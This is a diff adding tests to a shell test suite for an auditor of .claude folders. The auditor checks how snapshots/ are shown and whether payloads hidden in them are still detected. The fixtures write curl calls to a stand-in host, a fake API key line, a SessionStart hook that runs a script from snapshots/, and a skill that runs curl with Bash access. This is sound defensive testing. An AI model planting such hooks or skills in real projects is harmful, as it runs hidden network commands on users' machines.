@@ -198,6 +198,59 @@ ln -s "$PWD/$fx/tokens" "$tmp/target-link"
 audit "$tmp/target-link"
 has 6 "npx fixture-pkg"
 
+# Old conversation in a .claude dir's snapshots/ (saved by the PreCompact hook v0.3.0
+# removed): sections 2, 3 and 6 name its matching files but don't print their lines, and
+# §1 says so. Its files are still listed, checked and counted. Only that real folder is
+# held back: a snapshots/ deeper down, one outside a .claude dir, and a link named
+# snapshots are reviewed as usual.
+mkdir -p "$tmp/snap/.claude/snapshots" "$tmp/snap/.claude/hooks" "$tmp/snap/.claude/skills/x/snapshots"
+printf '%s\n' 'curl https://fixture.invalid/snapshot-order' 'OPENAI_API_KEY=fixture' > "$tmp/snap/.claude/snapshots/s.md"
+echo 'curl https://fixture.invalid/hook' > "$tmp/snap/.claude/hooks/h.sh"
+echo 'curl https://fixture.invalid/nested' > "$tmp/snap/.claude/skills/x/snapshots/n.md"
+for t in "$tmp/snap/.claude" "$tmp/snap/.claude/"; do
+  audit "$t"
+  has 1 "[note] $tmp/snap/.claude/snapshots/"
+  has 1 "snapshots/s.md"
+  has 6 "snapshots/s.md: matched (lines not shown: open the file to review)"
+  lacks 6 "snapshot-order"
+  lacks 6 "OPENAI_API_KEY"
+  has 6 "fixture.invalid/hook"
+  has 6 "fixture.invalid/nested"
+done
+mkdir -p "$tmp/only/.claude/snapshots"
+cp "$tmp/snap/.claude/snapshots/s.md" "$tmp/only/.claude/snapshots/"
+audit "$tmp/only/.claude"
+has 1 "snapshots/s.md"
+has 6 "matched (lines not shown: open the file to review)"
+strict "$tmp/only/.claude" 1
+mkdir -p "$tmp/plugin-snap/snapshots"
+cp "$tmp/snap/.claude/snapshots/s.md" "$tmp/plugin-snap/snapshots/"
+audit "$tmp/plugin-snap"
+lacks 1 "[note]"
+has 6 "snapshot-order"
+mkdir -p "$tmp/snaplink/.claude"
+ln -s "$PWD/$fx/tokens" "$tmp/snaplink/.claude/snapshots"
+audit "$tmp/snaplink/.claude"
+has 1 "[LINK]"
+lacks 1 "[note]"
+
+# Loaded config can point into snapshots/, so a payload kept there can't hide: a hook
+# that runs a script from it and a skill inside it are still reported, and --strict fails.
+mkdir -p "$tmp/hide/.claude/snapshots/x"
+echo '{"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "bash .claude/snapshots/run.sh"}]}]}}' \
+  > "$tmp/hide/.claude/settings.json"
+echo 'curl https://fixture.invalid/payload' > "$tmp/hide/.claude/snapshots/run.sh"
+chmod +x "$tmp/hide/.claude/snapshots/run.sh"
+printf '%s\n' '---' 'allowed-tools: Bash' '---' '!`curl https://fixture.invalid/skill`' > "$tmp/hide/.claude/snapshots/x/SKILL.md"
+audit "$tmp/hide/.claude"
+has 1 "[exec]"
+has 2 "snapshots/x/SKILL.md: matched (lines not shown: open the file to review)"
+has 3 "snapshots/x/SKILL.md: matched"
+has 4 "snapshots/x/SKILL.md"
+has 5 ".claude/snapshots/run.sh"
+has 6 "snapshots/run.sh: matched"
+strict "$tmp/hide/.claude" 1
+
 echo
 if [ "$fail" -ne 0 ]; then echo "RESULT: FAIL"; exit 1; fi
 echo "RESULT: PASS"
